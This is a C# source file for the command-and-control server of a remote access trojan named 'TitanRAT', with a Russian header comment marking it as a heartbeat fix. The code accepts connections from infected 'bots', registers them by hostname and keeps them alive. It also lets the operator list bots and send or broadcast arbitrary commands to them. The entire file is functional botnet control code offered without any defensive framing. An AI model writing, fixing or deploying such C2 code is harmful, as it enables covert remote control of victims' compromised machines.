// Server/Program.cs — ИСПРАВЛЕННЫЙ (Heartbeat Ping)
using System.Net;
using System.Net.Sockets;
using System.Collections.Concurrent;
using TitanRAT.Server;

class Program
{
    private static readonly ConcurrentDictionary<string, ClientSession> _clients = new();
    private static volatile bool _running = true;
    private const int Port = 12345;
    
    static async Task Main(string[] args)
    {
        Console.WriteLine($"[C2] Starting server on port {Port}...");
        
        var listener = new TcpListener(IPAddress.Any, Port);
        listener.Start();
        
        // Start console input handler
        var consoleTask = Task.Run(HandleConsoleInput);
        
        // Accept loop
        while (_running)
        {
            try
            {
                var client = await listener.AcceptTcpClientAsync();
                _ = Task.Run(() => HandleClientAsync(client));
            }
            catch when (_running) { /* Ignore errors during shutdown */ }
        }
        
        // Cleanup
        listener.Stop();
        foreach (var session in _clients.Values) session.Close();
        await consoleTask;
    }
    
    private static async Task HandleClientAsync(TcpClient client)
    {
        var session = new ClientSession(Guid.NewGuid().ToString(), client);
        string? line;
        
        try
        {
            // Handshake: HELLO
            line = await session.ReadLineAsync();
            if (line != "HELLO") { session.Close(); return; }
            await session.SendCommandAsync("ACK");
            
            // Registration: REGISTER:hostname
            line = await session.ReadLineAsync();
            if (line?.StartsWith("REGISTER:") != true) { session.Close(); return; }
            
            session.Hostname = line["REGISTER:".Length..];
            _clients[session.Id] = session;
            Console.WriteLine($"[+] Bot connected: {session.Hostname} ({session.Id})");
            
            await session.SendCommandAsync($"ID:{session.Id}");
            
            // Main loop: BEATs and responses
            while (_running)
            {
                line = await session.ReadLineAsync();
                if (line == null) break; // Disconnected
                
                session.LastSeen = DateTime.UtcNow;
                
                if (line.StartsWith("BEAT:"))
                {
                    // FIX: Send 'ping' instead of 'ACK'.
                    // Agent understands 'ping' and replies 'pong'.
                    // This keeps the connection alive without error spam.
                    await session.SendCommandAsync("ping");
                }
                else
                {
                    // This is a response to a command we sent (e.g. from console)
                    Console.WriteLine($"[RESPONSE] {session.Id}: {line}");
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[!] Error handling {session.Id}: {ex.Message}");
        }
        finally
        {
            _clients.TryRemove(session.Id, out _);
            session.Close();
            Console.WriteLine($"[-] Bot disconnected: {session.Hostname}");
        }
    }
    
    private static void HandleConsoleInput()
    {
        while (_running)
        {
            var input = Console.ReadLine();
            if (string.IsNullOrWhiteSpace(input)) continue;
            
            var parts = input.Split(' ', 2);
            var cmd = parts[0].ToLower();
            
            switch (cmd)
            {
                case "list":
                    Console.WriteLine("\n[Connected Bots]");
                    Console.WriteLine($"{"ID",-36} {"Hostname",-20} {"Last Seen"}");
                    Console.WriteLine(new string('-', 70));
                    foreach (var c in _clients.Values)
                        Console.WriteLine($"{c.Id,-36} {c.Hostname,-20} {c.LastSeen:HH:mm:ss}");
                    Console.WriteLine();
                    break;
                    
                case "send":
                    if (parts.Length < 2) { Console.WriteLine("Usage: send <id> <command>"); break; }
                    var sendParts = parts[1].Split(' ', 2);
                    if (sendParts.Length < 2) { Console.WriteLine("Usage: send <id> <command>"); break; }
                    
                    if (_clients.TryGetValue(sendParts[0], out var target))
                    {
                        Console.WriteLine($"[>] Sending to {sendParts[0]}: {sendParts[1]}");
                        _ = target.SendCommandAsync(sendParts[1]);
                    }
                    else
                    {
                        Console.WriteLine($"[!] Bot {sendParts[0]} not found");
                    }
                    break;
                    
                case "broadcast":
                    if (parts.Length < 2) { Console.WriteLine("Usage: broadcast <command>"); break; }
                    Console.WriteLine($"[>] Broadcasting: {parts[1]}");
                    foreach (var c in _clients.Values)
                        _ = c.SendCommandAsync(parts[1]);
                    break;
                    
                case "quit":
                    Console.WriteLine("[*] Shutting down...");
                    _running = false;
                    break;
                    
                default:
                    Console.WriteLine($"[!] Unknown command: {cmd}");
                    break;
            }
        }
    }
}